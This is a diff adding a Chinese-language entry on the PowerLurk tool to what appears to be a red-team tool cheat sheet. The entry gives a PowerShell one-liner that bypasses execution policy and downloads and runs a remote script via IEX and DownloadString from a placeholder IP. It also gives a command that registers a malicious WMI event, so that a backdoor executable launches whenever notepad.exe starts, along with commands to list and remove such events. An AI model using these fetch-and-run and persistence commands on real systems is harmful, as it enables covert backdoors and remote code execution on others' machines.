@@ -103,12 +103,28 @@ SharpUp.exe audit ModifiableServiceBinaries
 * 无需解释
 
 ---
+# 10.PowerLurk-master
+* 项目地址：https://github.com/Sw4mpf0x/PowerLurk
+* 项目用处：
+```
+本地导入：
+PS> powershell.exe -NoP -Exec ByPass -C Import-Module c:\\temp\\PowerLurk.ps1
+远程导入：
+PS> powershell.exe -NoP -C "IEX (New-Object Net.WebClient).DownloadString('http://<IP>/PowerLurk.ps1'); Get-WmiEvent"
+
+
+#返回名称为“RedTeamEvent”的所有活动 WMI 事件对象
+Get-WmiEvent -Name 名称
+#删除“RedTeamEvent”WMI 事件对象
+Get-WmiEvent -Name RedTeamEvent | Remove-WmiObject
 
 
 
-
-
-
+#注册-MaliciousWmiEvent（此 cmdlet 是 PowerLurk 的核心）
+#每当 notepad.exe 启动时，执行后门 http.exe
+Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Users\lsc\Desktop\http.exe" -Trigger ProcessStart -ProcessName notepad.exe
+#清除恶意 WMI 事件（名称为WmiBackdoor）
+Get-WmiEvent -Name WmiBackdoor | Remove-WmiObject
 
 
 
